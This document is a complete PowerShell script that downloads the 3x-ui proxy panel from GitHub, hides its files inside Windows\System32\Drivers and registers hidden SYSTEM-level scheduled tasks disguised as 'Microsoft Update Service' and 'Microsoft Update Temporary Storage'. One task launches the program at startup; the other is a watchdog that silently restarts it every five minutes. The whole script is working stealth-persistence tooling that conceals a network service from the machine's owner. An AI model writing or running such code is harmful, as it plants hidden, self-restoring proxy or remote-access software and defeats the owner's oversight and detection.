#Requires -RunAsAdministrator

$downloadDir = Join-Path $env:SystemDrive "Windows\System32\Drivers"
$zipFileName = "x-ui-windows-amd64.zip"
$zipPath = Join-Path $downloadDir $zipFileName
$url = "https://github.com/MHSanaei/3x-ui/releases/latest/download/$zipFileName"
$extractedDirName = "x-ui"
$extractedPath = Join-Path $downloadDir $extractedDirName
$executableName = "x-ui.exe"
$executablePath = Join-Path $downloadDir $executableName
$mainTaskName = "Microsoft Update Service"
$watchdogTaskName = "Microsoft Update Temporary Storage"
$taskPath = "\Microsoft\Windows"

try {
    Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Error "Error downloading file: $_"
    exit 1
}

try {
    Expand-Archive -Path $zipPath -DestinationPath $downloadDir -Force -ErrorAction Stop
    $sourceFiles = Get-ChildItem -Path $extractedPath
    if ($null -ne $sourceFiles) {
        $fileNamesToHide = $sourceFiles.Name
        Move-Item -Path $sourceFiles.FullName -Destination $downloadDir -Force
        
        foreach ($fileName in $fileNamesToHide) {
            $itemToHidePath = Join-Path $downloadDir $fileName
            if (Test-Path $itemToHidePath) {
                Set-ItemProperty -Path $itemToHidePath -Name IsHidden -Value $true -ErrorAction SilentlyContinue
            }
        }
    }
    if (Test-Path -Path $extractedPath) {
        Remove-Item -Path $extractedPath -Recurse -Force
    }
} catch {
    Write-Error "Error processing archive: $_"
    if (Test-Path -Path $zipPath) {
        Remove-Item -Path $zipPath -Force
    }
    exit 1
}

if (Test-Path -Path $zipPath) {
    Remove-Item -Path $zipPath -Force
}

try {
    $action = New-ScheduledTaskAction -Execute $executablePath -ErrorAction Stop
    $trigger = New-ScheduledTaskTrigger -AtStartup -ErrorAction Stop
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest -ErrorAction Stop
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
    Register-ScheduledTask -TaskName $mainTaskName -TaskPath $taskPath -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
} catch {
    Write-Error "Error creating startup task: $_"
    exit 1
}

try {
    $processName = $executableName.Split('.')[0]
    $watchdogCommand = "if (-not (Get-Process -Name '$processName' -ErrorAction SilentlyContinue)) { Start-Process -FilePath '$executablePath' -WindowStyle Hidden }"
    $watchdogAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command `"$watchdogCommand`"" -ErrorAction Stop
    $watchdogTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -ErrorAction Stop
    Register-ScheduledTask -TaskName $watchdogTaskName -TaskPath $taskPath -Action $watchdogAction -Trigger $watchdogTrigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
} catch {
    Write-Error "Error creating watchdog task: $_"
    exit 1
}

Start-ScheduledTask -TaskName $mainTaskName -TaskPath $taskPath
